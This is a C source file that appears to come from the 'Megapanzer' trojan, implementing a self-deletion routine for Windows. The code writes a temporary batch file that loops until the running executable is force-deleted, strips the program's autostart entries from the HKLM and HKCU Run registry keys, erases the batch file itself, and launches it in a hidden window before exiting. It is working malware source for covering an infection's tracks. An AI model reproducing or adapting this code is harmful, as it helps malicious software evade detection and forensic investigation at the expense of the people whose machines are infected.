#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <time.h>
#include "Megapanzer_Definitions.h"

extern char gRealRegistryName[MAX_BUF_SIZE + 1];



int selfDelete()
{
  WIN32_FIND_DATA lFileData; 
  HANDLE lSearchHandle;  
  char lFilePattern[MAX_BUF_SIZE + 1]; 
  char lTemp[MAX_BUF_SIZE + 1];
  char lTempDirectory[MAX_BUF_SIZE + 1];
  char lCWD[MAX_BUF_SIZE + 1];
  char lBatchFileNameFullPath[MAX_BUF_SIZE + 1];
  char lCommand[MAX_BUF_SIZE + 1];
  char lProgramName[MAX_BUF_SIZE + 1];

  HKEY lRegistryHeaps[] = {HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, NULL};
  HKEY lKeyHandle;


  long lEnumRet = 0;
  DWORD lLength = 100;

  time_t lTimeStamp;
  int lRetVal = 0;
  int lFuncRetVal = 0;
  int lCounter = 0;
  int lCounter2 = 0;

    ////
   // initialization
  ////

  ZeroMemory(lProgramName, sizeof(lProgramName));
  ZeroMemory(lTemp, sizeof(lTemp));
  ZeroMemory(lTempDirectory, sizeof(lTempDirectory));
  ZeroMemory(lCWD, sizeof(lCWD));
  ZeroMemory(lBatchFileNameFullPath, sizeof(lBatchFileNameFullPath));
  ZeroMemory(&lTimeStamp, sizeof(lTimeStamp));

  GetModuleFileName(NULL, lProgramName, sizeof(lProgramName));
  time(&lTimeStamp);

    ////
   // create temporary directory
  ////

  if (GetTempPath(sizeof(lTempDirectory) - 1, lTempDirectory) > 0)
    if (lTempDirectory[strlen(lTempDirectory) - 1] != '\\')
      strcat(lTempDirectory, "\\");    

    
    ////
   // generate batch file name
  ////

  GetCurrentDirectory(sizeof(lCWD) - 1, lCWD);
  if (lCWD[strlen(lCWD) - 1] != '\\')
    strcat(lCWD, "\\");

  _snprintf(lBatchFileNameFullPath, sizeof(lBatchFileNameFullPath) - 1, "%s%d.bat", lTempDirectory, lTimeStamp);
      
  printToFile(lBatchFileNameFullPath, "@echo off");      
  printToFile(lBatchFileNameFullPath, ":Repeat");

  ZeroMemory(lCommand, sizeof(lCommand));
  _snprintf(lCommand, sizeof(lCommand) - 1, "@del /F \"%s\"", lProgramName);
  printToFile(lBatchFileNameFullPath, lCommand);
    
  ZeroMemory(lCommand, sizeof(lCommand));
  _snprintf(lCommand, sizeof(lCommand) - 1, "if exist \"%s\" goto Repeat", lProgramName);
  printToFile(lBatchFileNameFullPath, lCommand);  

  

    ////
   // generate delete entry for registry keys/values
  ////

  for(lCounter = 0; lRegistryHeaps[lCounter] != NULL; lCounter++)
  {
    if (RegOpenKeyEx(lRegistryHeaps[lCounter], "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &lKeyHandle) == ERROR_SUCCESS)
    {
      lCounter2 = 0;
      ZeroMemory(lTemp, sizeof(lTemp));
      lLength = sizeof(lTemp) - 1;


      while((lEnumRet = RegEnumValue(lKeyHandle, lCounter2, lTemp, &lLength, NULL, NULL, NULL, NULL)) == ERROR_SUCCESS)
      {
        if (StrCmpNI(gRealRegistryName, lTemp, sizeof(gRealRegistryName)) == 0)
        {
          ZeroMemory(lCommand, sizeof(lCommand));
          if (lRegistryHeaps[lCounter] == CURRENT_USER)
          {
            _snprintf (lCommand, sizeof(lCommand) - 1, "@reg delete HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\ /v %s /f",lTemp);
            printToFile(lBatchFileNameFullPath, lCommand);
          } else if (lRegistryHeaps[lCounter] == LOCAL_MACHINE) {
            _snprintf (lCommand, sizeof(lCommand) - 1, "@reg delete HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\ /v %s /f",lTemp);
            printToFile(lBatchFileNameFullPath, lCommand);            
          } // if (lRegistryHeaps[lCou...
        } // if (StrCmpNI(gRealRegistryName, lTemp...


        lLength = sizeof(lTemp) - 1;
        lCounter2++;
        ZeroMemory(lTemp, sizeof(lTemp));
      } // while((lEnumRet = RegEnumValue(lKeyH...


      RegCloseKey(lKeyHandle);
    } // if (RegOpenKeyEx(lReg...
  } // for(lCounter = 0; lRegistryHeaps[lCoun...




    ////
   // delete Mega Panzer files
  ////

  ZeroMemory(lCommand, sizeof(lCommand));
  _snprintf(lCommand, sizeof(lCommand) - 1, "@del /F \"%s\" || move /Y \"%s\" \"%s\"", lBatchFileNameFullPath, lBatchFileNameFullPath, lTempDirectory);
  printToFile(lBatchFileNameFullPath, lCommand);

  
    ////
   // run batch script
  ////

  ShellExecute(NULL, NULL, lBatchFileNameFullPath, NULL, "c:\\", SW_HIDE);
  exit(lRetVal);
}




int printToFile(char *pOutputFileName, char* pCommandString)
{
  int lRetVal = 0;
  HANDLE lFileHandle = INVALID_HANDLE_VALUE;
  DWORD lBytesWritten = 0;
  char lTemp[MAX_BUF_SIZE + 1];


  if ((lFileHandle = CreateFile(pOutputFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
  {
    SetFilePointer(lFileHandle, 0, 0, FILE_END);
	ZeroMemory(lTemp, sizeof(lTemp));
	snprintf(lTemp, sizeof(lTemp) - 1 , "%s\r\n", pCommandString);

	WriteFile(lFileHandle, lTemp, strlen(lTemp), &lBytesWritten, NULL);
    CloseHandle(lFileHandle);
  }

  return(lRetVal);	
}